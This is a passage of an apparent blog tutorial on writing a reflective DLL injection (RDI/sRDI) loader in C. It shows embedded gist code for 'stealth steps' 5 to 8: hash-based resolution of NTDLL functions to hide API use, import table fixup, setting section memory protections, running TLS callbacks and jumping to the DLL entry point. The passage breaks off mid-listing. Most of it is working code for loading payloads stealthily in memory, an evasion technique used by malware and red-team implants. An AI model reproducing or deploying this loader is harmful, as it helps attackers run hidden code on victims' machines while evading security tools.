          <td id="file-stealth_step_5-c-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-stealth_step_5-c-LC24" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (current_library){</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-stealth_step_5-c-LC25" class="blob-code blob-code-inner js-file-line">        ANSI_STRING a_string;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-stealth_step_5-c-LC26" class="blob-code blob-code-inner js-file-line">        PIMAGE_THUNK_DATA thunk = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-stealth_step_5-c-LC27" class="blob-code blob-code-inner js-file-line">        PIMAGE_THUNK_DATA original_thunk = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-stealth_step_5-c-LC28" class="blob-code blob-code-inner js-file-line">        thunk = (PIMAGE_THUNK_DATA)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + import_descriptor-&gt;<span class="pl-smi">FirstThunk</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-stealth_step_5-c-LC29" class="blob-code blob-code-inner js-file-line">        original_thunk = (PIMAGE_THUNK_DATA)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + import_descriptor-&gt;<span class="pl-smi">OriginalFirstThunk</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-stealth_step_5-c-LC30" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">while</span> (thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span> != <span class="pl-c1">0</span>){</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-stealth_step_5-c-LC31" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">void</span> *p_ldr_get_procedure_address = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, LdrGetProcedureAddress_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-stealth_step_5-c-LC32" class="blob-code blob-code-inner js-file-line">            LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t) p_ldr_get_procedure_address;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-stealth_step_5-c-LC33" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (<span class="pl-c1">IMAGE_SNAP_BY_ORDINAL</span>(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>)) {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-stealth_step_5-c-LC34" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">g_ldr_get_procedure_address</span>(current_library, <span class="pl-c1">NULL</span>, (WORD) original_thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>, (PVOID *) &amp;(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span>));</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-stealth_step_5-c-LC35" class="blob-code blob-code-inner js-file-line">            } <span class="pl-k">else</span> {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-stealth_step_5-c-LC36" class="blob-code blob-code-inner js-file-line">                PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-stealth_step_5-c-LC37" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">FILL_STRING</span>(a_string, functionName-&gt;<span class="pl-smi">Name</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-stealth_step_5-c-LC38" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">g_ldr_get_procedure_address</span>(current_library, &amp;a_string, <span class="pl-c1">0</span>, (PVOID *) &amp;(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span>));</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-stealth_step_5-c-LC39" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-stealth_step_5-c-LC40" class="blob-code blob-code-inner js-file-line">            ++thunk;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-stealth_step_5-c-LC41" class="blob-code blob-code-inner js-file-line">            ++original_thunk;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L42" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-stealth_step_5-c-LC42" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L43" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-stealth_step_5-c-LC43" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L44" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-stealth_step_5-c-LC44" class="blob-code blob-code-inner js-file-line">    import_descriptor++;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L45" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-stealth_step_5-c-LC45" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/7ba7b2060f33c0edf72c8cc6b15c37b0/raw/61b7dc7c600235a0543b4781f484916246cbc2ea/stealth_step_5.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/7ba7b2060f33c0edf72c8cc6b15c37b0#file-stealth_step_5-c">
          stealth_step_5.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above code handles the dynamic linking of imported libraries in a Windows PE file. It iterates through the import descriptors in the PE file, loads the import libraries using the <code>LdrLoadDll</code> function, retrieves the addresses of imported functions using the <code>LdrGetProcedureAddress</code> function, and updates the import address table (IAT) with the resolved addresses. The code uses Windows-specific data types and structures, such as <code>PIMAGE_IMPORT_DESCRIPTOR</code> and <code>UNICODE_STRING</code>, and makes use of function pointers obtained through hash-based lookups to dynamically call functions from the NTDLL library, a Windows system library providing low-level functions for managing processes, threads, and memory.</p><!--kg-card-end: html--><hr><p></p><h3 id="stealth-step-6">Stealth Step 6</h3><p>The protection settings of the different sections in the DLL image are applied...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/f5faf988ada21048b17e0a676307d20c.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121801821" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stealth_step_6-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stealth_step_6.c">
        <tbody><tr>
          <td id="file-stealth_step_6-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-stealth_step_6-c-LC1" class="blob-code blob-code-inner js-file-line">PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-stealth_step_6-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; nt_headers-&gt;FileHeader.NumberOfSections; i++, section_header++) {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-stealth_step_6-c-LC3" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (section_header-&gt;<span class="pl-smi">SizeOfRawData</span>) {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-stealth_step_6-c-LC4" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> executable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_EXECUTE) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-stealth_step_6-c-LC5" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> readable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_READ) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-stealth_step_6-c-LC6" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> writeable = (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_WRITE) != <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-stealth_step_6-c-LC7" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> protect = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-stealth_step_6-c-LC8" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-stealth_step_6-c-LC9" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (!executable &amp;&amp; !readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-stealth_step_6-c-LC10" class="blob-code blob-code-inner js-file-line">            protect = PAGE_NOACCESS;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-stealth_step_6-c-LC11" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; !readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-stealth_step_6-c-LC12" class="blob-code blob-code-inner js-file-line">            protect = PAGE_WRITECOPY;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-stealth_step_6-c-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-stealth_step_6-c-LC14" class="blob-code blob-code-inner js-file-line">            protect = PAGE_READONLY;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-stealth_step_6-c-LC15" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> (!executable &amp;&amp; readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-stealth_step_6-c-LC16" class="blob-code blob-code-inner js-file-line">            protect = PAGE_READWRITE;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-stealth_step_6-c-LC17" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; !readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-stealth_step_6-c-LC18" class="blob-code blob-code-inner js-file-line">            protect = PAGE_EXECUTE;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-stealth_step_6-c-LC19" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; !readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-stealth_step_6-c-LC20" class="blob-code blob-code-inner js-file-line">            protect = PAGE_EXECUTE_WRITECOPY;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-stealth_step_6-c-LC21" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; readable &amp;&amp; !writeable)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-stealth_step_6-c-LC22" class="blob-code blob-code-inner js-file-line">            protect = PAGE_EXECUTE_READ;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-stealth_step_6-c-LC23" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> (executable &amp;&amp; readable &amp;&amp; writeable)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-stealth_step_6-c-LC24" class="blob-code blob-code-inner js-file-line">            protect = PAGE_EXECUTE_READWRITE;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-stealth_step_6-c-LC25" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-stealth_step_6-c-LC26" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (section_header-&gt;<span class="pl-smi">Characteristics</span> &amp; IMAGE_SCN_MEM_NOT_CACHED)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-stealth_step_6-c-LC27" class="blob-code blob-code-inner js-file-line">            protect |= PAGE_NOCACHE;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-stealth_step_6-c-LC28" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-stealth_step_6-c-LC29" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *p_nt_protect_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtProtectVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-stealth_step_6-c-LC30" class="blob-code blob-code-inner js-file-line">        NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-stealth_step_6-c-LC31" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">size_t</span> size = section_header-&gt;<span class="pl-smi">SizeOfRawData</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-stealth_step_6-c-LC32" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *address = dll_base + section_header-&gt;<span class="pl-smi">VirtualAddress</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-stealth_step_6-c-LC33" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_protect_virtual_memory</span>(<span class="pl-c1">NtCurrentProcess</span>(), &amp;address, &amp;size, protect, &amp;protect)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-stealth_step_6-c-LC34" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> -<span class="pl-c1">7</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-stealth_step_6-c-LC35" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-stealth_step_6-c-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-stealth_step_6-c-LC36" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/f5faf988ada21048b17e0a676307d20c/raw/c222f588d72ad50244c09ab794aaff9a5af96e42/stealth_step_6.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/f5faf988ada21048b17e0a676307d20c#file-stealth_step_6-c">
          stealth_step_6.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above code iterates through the sections of a DLL, as defined in its PE file header. For each section, it calculates the protection flags for the memory region where the section will be loaded, based on the characteristics of the section (such as executable, readable, and writable). It then calls the <code>NtProtectVirtualMemory()</code> function, obtained through a function pointer, to set the appropriate memory protection for the section. </p><!--kg-card-end: html--><hr><p></p><h3 id="stealth-step-7">Stealth Step 7</h3><p>Flush the instruction cache and check if the TLS has entries to copy...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/819707e2176cd1ba9f7ba3d653b6adfe.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121814431" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stealth_step_7-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stealth_step_7.c">
        <tbody><tr>
          <td id="file-stealth_step_7-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-stealth_step_7-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_nt_flush_instruction_cache = get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-stealth_step_7-c-LC2" class="blob-code blob-code-inner js-file-line">NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t) p_nt_flush_instruction_cache;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-stealth_step_7-c-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-en">g_nt_flush_instruction_cache</span>((HANDLE) -1, NULL, 0);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-stealth_step_7-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-stealth_step_7-c-LC5" class="blob-code blob-code-inner js-file-line">PIMAGE_TLS_CALLBACK *callback;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-stealth_step_7-c-LC6" class="blob-code blob-code-inner js-file-line">PIMAGE_DATA_DIRECTORY tls_entry = &amp;nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-stealth_step_7-c-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span>(tls_entry-&gt;<span class="pl-c1">Size</span>) {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-stealth_step_7-c-LC8" class="blob-code blob-code-inner js-file-line">    PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + tls_entry-&gt;<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-stealth_step_7-c-LC9" class="blob-code blob-code-inner js-file-line">    callback = (PIMAGE_TLS_CALLBACK *)(tls_dir-&gt;<span class="pl-smi">AddressOfCallBacks</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-stealth_step_7-c-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span>(; *callback; callback++)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-stealth_step_7-c-LC11" class="blob-code blob-code-inner js-file-line">        (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-stealth_step_7-c-LC12" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/819707e2176cd1ba9f7ba3d653b6adfe/raw/2dad00f4678ecfdc983df3132498859af04bede7/stealth_step_7.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/819707e2176cd1ba9f7ba3d653b6adfe#file-stealth_step_7-c">
          stealth_step_7.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The code above flushes the instruction cache using <code>NtFlushInstructionCache</code> after processing the IAT. Next, the code checks if the PE file has a TLS (Thread Local Storage) directory entry in its optional header, using the <code>IMAGE_DIRECTORY_ENTRY_TLS</code> constant. If it does, it retrieves the TLS directory from the PE file, which contains a list of TLS callback functions (AddressOfCallBacks) to be executed during thread initialization.</p><!--kg-card-end: html--><hr><p></p><h3 id="stealth-step-8">Stealth Step 8</h3><p>Finally, the loader transfers control to the executable's entry point...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/3e94fc8a5fd57ce5f491102f5707ef6d.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121801914" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stealth_step_7-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stealth_step_7.c">
        <tbody><tr>
          <td id="file-stealth_step_7-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-stealth_step_7-c-LC1" class="blob-code blob-code-inner js-file-line">DLLEntry DllEntry = (DLLEntry)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + nt_headers-&gt;OptionalHeader.AddressOfEntryPoint);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-stealth_step_7-c-LC2" class="blob-code blob-code-inner js-file-line">(*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_7-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
